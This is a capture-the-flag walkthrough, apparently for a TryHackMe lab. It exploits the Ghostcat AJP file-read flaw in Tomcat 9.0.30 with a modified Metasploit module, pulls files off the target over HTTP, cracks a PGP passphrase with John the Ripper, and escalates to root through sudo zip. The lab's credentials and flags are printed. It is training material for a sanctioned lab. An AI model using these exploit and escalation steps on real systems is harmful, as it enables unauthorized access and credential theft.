### Find the services exposed by the machine
```BASH
nmap -sV -p- 10.10.119.52
```
![image](https://github.com/user-attachments/assets/843c0030-20f7-4aa6-9408-5b3c25261a22)

TCP port 8009 is open and running the Apache JServ Protocol (AJP) 1.3, while port 8080 is serving an Apache Tomcat 9.0.30 instance. This version of Apache Tomcat (9.0.30), when combined with an exposed AJP port is vulnerable to the [Ghostcat vulnerability - CVE-2020-193](https://www.exploit-db.com/exploits/49039)

<span style="line-height:0.5;">&nbsp;</span>

### Get credentials
Exploit run a Metasploit module or code that depends on the Metasploit Framework, so we have to run it in Metasploit. Before moving file to directory I had to make some fixes to work. 

Copy code to new file, for exmaple `exploit.rb`. After that create new directory for custom module:
```BASH
mkdir -p ~/.msf4/modules/exploits/multi/http
```
Move  `exploit.rb` to new directory:
```BASH
mv exploit.rb ~/.msf4/modules/exploits/multi/http/ghostcat.rb
```
Run msfconsole
```BASH
msfconsole
```
Reload all scripts
```BASH
reload_all
```
Use custom module from exploit db
```BASH
use exploit/multi/http/ghostcat
```
Set parameters and run
```BASH
set RHOSTS 10.10.149.201
set RPORT 8009
set FILENAME /WEB-INF/web.xml
run
```

That means the exploit successfully read the file from the remote Tomcat server via the AJP port:
![image](https://github.com/user-attachments/assets/ed1c8cf8-ae01-4e7a-af22-9cce1496c9cf)

This exploit successfully makes the AJP request, but it does not print the actual response body. Go back to directory where script sits and make few changes:
Replace this:
```RUBY
print "#{buf[idx..(idx+len)]}"
```
With:
```RUBY
content = buf[idx...(idx+len)]
print_status("File contents:\n")
print_line(content)
```
![image](https://github.com/user-attachments/assets/8bfb432d-af72-4b74-8bb0-4b29f97ef7f2)
Server responded with:
```BASH
500 Internal Server Error
Message: The requested resource [index] is not available
```
This error comes from this line in custom module.
```RUBY
{"req_attribute" => ["javax.servlet.include.request_uri", "index"]},
```
Go back to directory where script sits and make some more changes:
Replace this:
```RUBY
attributes = [
    {"req_attribute" => ["javax.servlet.include.request_uri", "index"]},
    {"req_attribute" => ["javax.servlet.include.path_info" , target_file]},
    {"req_attribute" => ["javax.servlet.include.servlet_path" , "/"]}
]
```
With this:
```RUBY
attributes = [
    {"req_attribute" => ["javax.servlet.include.request_uri", "/"]},
    {"req_attribute" => ["javax.servlet.include.path_info" , target_file]},
    {"req_attribute" => ["javax.servlet.include.servlet_path" , "/"]}
]
```

Go back to msfconsole. Set parameters and run
```BASH
set RHOSTS 10.10.149.201
set RPORT 8009
set FILENAME /WEB-INF/web.xml
run
```
From the response you can see that credentials are `skyfuck:8730281lkjlkjdqlksalks`  

![image](https://github.com/user-attachments/assets/9d9d8391-1e8e-4079-96d3-beb9665c44c7)
![image](https://github.com/user-attachments/assets/1ee42b3a-bb7d-4f8a-9639-c016b6204ade)

<span style="line-height:0.5;">&nbsp;</span>

### Log in to the skyfuck account
SSH to skyfuck account.
```BASH
ssh skyfuck@10.10.149.201
```
![image](https://github.com/user-attachments/assets/b3d3f0ca-4b05-4925-bd46-1ca9a8458e55)

In skyfuck account there are two weird files: `credential.pgp` and `tryhackme.asc`
These are PGP encrypted files, which likely contain the user flag.  

![image](https://github.com/user-attachments/assets/d6526c3c-a1d9-4e02-bd78-0801d744d2e3)

Run python http server on vicitim machine.
```BASH
python3 -m http.server 8000
```

Download files on attack machine.
```BASH
wget http://10.10.149.201:8000/credential.pgp
wget http://10.10.149.201:8000/tryhackme.asc
```
![image](https://github.com/user-attachments/assets/e8924bc1-ac8c-4e27-921a-35e5a7a76071)

<span style="line-height:0.5;">&nbsp;</span>

### Crack the PGP key passphrase with John the Ripper.
Run gpg2john on the exported key.
```BASH
gpg2john secret.asc > pgp.hash
```
Run John on the hash.
```BASH
john --wordlist=/usr/share/wordlists/rockyou.txt pgp.hash
```
![image](https://github.com/user-attachments/assets/a3fe8843-6791-4c58-a713-98f8c63ace80)

The passphrase is `alexandru`. That is the passphrase protecting the tryhackme.asc, which is used to decrypt the file credential.pgp. Decrypt credential.pgp.
```BASH
gpg --import tryhackme.asc
gpg --decrypt credential.pgp
```
![image](https://github.com/user-attachments/assets/74e4d93c-a1ab-420b-91b0-a1c9db65f53a)
There are credentials to new user: `merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j`

### Log in to the merlin account
Go back to terminal with skyfuck account logged in. Login as merlin.
```BASH
su merlin
```
Go to merlin's home directory.
```BASH
cd /home/merlin
```
![image](https://github.com/user-attachments/assets/87e0dbca-d8a4-4fd3-968a-2d129ad4d7c8)

user.txt flag:
<pre>THM{GhostCat_1s_so_cr4sy}</pre>

<span style="line-height:0.5;">&nbsp;</span>

### Escalate privileges and obtain root.txt
Run this command to check what merlin is allowed to run as root or with elevated privileges, without a password or under specific conditions. 
```BASH
sudo -l
```

![image](https://github.com/user-attachments/assets/fd072d8d-0b6a-416f-8017-843643002cfe)
You can run /usr/bin/zip as root without password. To escalate privileges using zip go to GTFOBins and search zip. Go to 'Sudo' section and if you can run zip as root via sudo, spawn a root shell by running:
```BASH
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```
After that read root flag.
```BASH
cat /root/root.txt
```
![image](https://github.com/user-attachments/assets/c9d1a816-d330-41a0-bab0-196ec2525ba3)

root.txt flag:
<pre>THM{Z1P_1S_FAKE}</pre>
